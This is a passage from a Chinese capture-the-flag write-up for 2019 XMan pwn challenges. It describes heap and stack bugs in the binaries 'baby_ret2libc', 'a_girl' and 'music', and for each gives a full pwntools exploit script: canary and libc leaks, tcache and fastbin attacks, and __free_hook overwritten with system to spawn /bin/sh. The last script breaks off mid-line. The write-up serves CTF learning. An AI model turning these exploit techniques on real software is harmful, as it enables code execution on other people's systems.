punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'edit the flag:\n'</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">display</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'your choice: '</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'to display:\n'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'flag: '</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>fake_chunk <span class="token operator">=</span> <span class="token number">0x602060</span> <span class="token operator">-</span> <span class="token number">8</span>add<span class="token punctuation">(</span><span class="token string">'shinnosuke'</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'shinnosuke'</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'shinnosuke'</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># hijaking chunk list address</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'shinnosuke'</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>  add<span class="token punctuation">(</span><span class="token string">'shinnosuke'</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># gdb.attach(p)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x40</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> display<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>free_hook_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>edit<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="baby-ret2libc"><a href="#baby-ret2libc" class="headerlink" title="baby_ret2libc"></a>baby_ret2libc</h1><h2 id="0x01-查看文件-1"><a href="#0x01-查看文件-1" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/3.png"></div>保护全开考点：canary、rop## 0x02 IDA分析<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/4.png"></div>溢出## 0x03 思路<p>我们可以看到这里有两次溢出，而且后面还有输出，那么我们可以考虑输出canary。输出canary后再想办法在最后返回start函数再leak出libc基址，来进行rop getshell。</p><h2 id="0x04-exp-1"><a href="#0x04-exp-1" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./baby_ret2libc"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p = remote("139.9.217.6",2333)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./baby_ret2libc"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc-2.23.so"</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"secret:"</span><span class="token punctuation">,</span><span class="token string">"aaaaaaaaa"</span><span class="token operator">*</span><span class="token number">14</span><span class="token operator">+</span><span class="token string">"bbbbbbbbbb"</span><span class="token operator">+</span><span class="token string">"\x30"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bbbbbbbbbb"</span><span class="token punctuation">)</span>canary <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x30</span>base_address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0xaa0</span><span class="token keyword">print</span> <span class="token string">"base address: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>base_address<span class="token punctuation">)</span>plt_alarm <span class="token operator">=</span> base_address <span class="token operator">+</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'alarm'</span><span class="token punctuation">]</span>rop_rdi_ret <span class="token operator">=</span> base_address <span class="token operator">+</span> <span class="token number">0xb03</span>rop_rbp_ret <span class="token operator">=</span> base_address <span class="token operator">+</span> <span class="token number">0x8e0</span>base_address <span class="token operator">=</span> base_address <span class="token operator">>></span> <span class="token number">12</span>base_address <span class="token operator">=</span> base_address <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token keyword">print</span> <span class="token string">"base address now is: "</span><span class="token punctuation">,</span>hex<span class="token punctuation">(</span>base_address<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x88</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_address<span class="token operator">+</span><span class="token number">0x1a50</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_address<span class="token operator">+</span><span class="token number">0x1800</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Let's go: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>payload1 <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x98</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"secret:"</span><span class="token punctuation">,</span>payload1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>libc_start_main <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">240</span>libcbase <span class="token operator">=</span> libc_start_main <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span>addr_system <span class="token operator">=</span> libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>addr_bin_sh <span class="token operator">=</span> libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x11"</span><span class="token operator">*</span><span class="token number">0x88</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>canary<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>base_address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rop_rdi_ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr_bin_sh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>addr_system<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Let's go: "</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="a-girl"><a href="#a-girl" class="headerlink" title="a_girl"></a>a_girl</h1><h2 id="0x01-查看文件-2"><a href="#0x01-查看文件-2" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/5.png"></div>经过测试这个题版本是在libc2.27版本下考点：2.27 double free## 0x02 IDA分析<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/6.png"></div>UAF漏洞<h2 id="0x03-思路-1"><a href="#0x03-思路-1" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><p>这道题目的思路就是利用UAF简单的泄露heap地址，最后再劫持tcache header改hook或者别的就可以成功了。</p><h2 id="0x04-exp-2"><a href="#0x04-exp-2" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./a_girl'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcp <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./a_girl'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = remote("139.159.155.243",2333)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' choice : \n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'what is it letter?\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' choice : \n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Give me your index : \n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'1.'</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' choice : \n'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Give me your index : \n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'Now give me your content\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' choice : \n'</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Give me your index : \n'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token operator">+</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0x78</span><span class="token punctuation">)</span>  delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>                     heap_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>heap_base <span class="token operator">=</span> heap_base <span class="token operator">-</span> <span class="token number">0x280</span>chunk1 <span class="token operator">=</span> heap_base<span class="token operator">+</span><span class="token number">0x290</span>chunk2 <span class="token operator">=</span> chunk1 <span class="token operator">+</span> <span class="token number">0x90</span> <span class="token operator">+</span> <span class="token number">0x30</span>fake <span class="token operator">=</span> p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>fake<span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>chunk2<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>  delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>  libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1e4ca0</span>free_hook <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="music"><a href="#music" class="headerlink" title="music"></a>music</h1><h2 id="0x01-查看文件-3"><a href="#0x01-查看文件-3" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/7.png"></div>PIE没开启考点：多线程堆溢出<h2 id="0x02-IDA分析-1"><a href="#0x02-IDA分析-1" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h2><p>主函数中：开了一个线程pthread_create(这个可以当作是创建一个线程，其中的参数是需要执行的函数，其它的参数有讲究，需要再查吧，这样就进入他的线程里了)，至于后面那个pthread_join函数是未来使主线程阻塞等待 其它线程退出。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/8.png"></div>进入子线程函数看看：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/9.png"></div>我们看到bss段上数据被赋为函数指针，后来又进行调用这个函数指针。<p>我们看看读取函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/01/2019-xman-dong-ling-ying-jie-ying-sai/10.png"></div><p>第一次不read满的话，第二次还能继续read。</p><h2 id="0x03-思路-2"><a href="#0x03-思路-2" class="headerlink" title="0x03 思路"></a>0x03 思路</h2><ol><li><p>首先将线程第一次分配的非主分配区填充满</p></li><li><p>再次申请时，线程只能申请一个新的sub_heap，此时的sub_heap地址位于第一次申请的sub_heap低地址位置。</p></li><li><p>再次将该sub_heap填充满，在最后一次填充时进行复制，由于存在堆溢出，则可以溢出覆盖非主分配区的malloc_state结构体（thread arena），此时的利用和覆盖了main_arena的利用方法一致。</p></li><li><p>选择fastbin attack的方法进行攻击，将fastbin劫持到bss段上去，因为bss段上有一个函数指针，会在赋值后调用，将这个函数赋值为system，并将堆块起始覆盖为’/bin/sh’即可获得shell。</p></li></ol><h2 id="0x04-exp-3"><a href="#0x04-exp-3" class="headerlink" title="0x04 exp"></a>0x04 exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug<span class="token operator">=</span><span class="token number">0</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./play_music'</span><span class="token punctuation">)</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p<span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./play_music'</span><span class="token punctuation">)</span>    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p<span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'139.9.79.187'</span><span class="token punctuation">,</span><span class="token number">2333</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'s name: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'name: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' song: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">vote</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'song: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">cancel</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'choice: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'song: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#0</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1</span>cancel<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'count: '</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7ffff7bb4b78</span><span class="token operator">-</span><span class="token number">0x7ffff77f0000</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libcbase = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libcbase<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#2</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span><span class="token string">'\x44'</span><span class="token operator">*</span><span class="token number">0x50</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#3</span>name <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>libcbase<span class="token operator">+</span><span class="token number">0x7f0e8c25eb20</span><span class="token operator">-</span><span class="token number">0x7f0e8be9a000</span><span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 伪造chunk以及hook附近满足size的地址为fd</span>add<span class="token punctuation">(</span><span class="token number">0x50</span><span class="token punctuation">,</span>name<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span> <span class="token 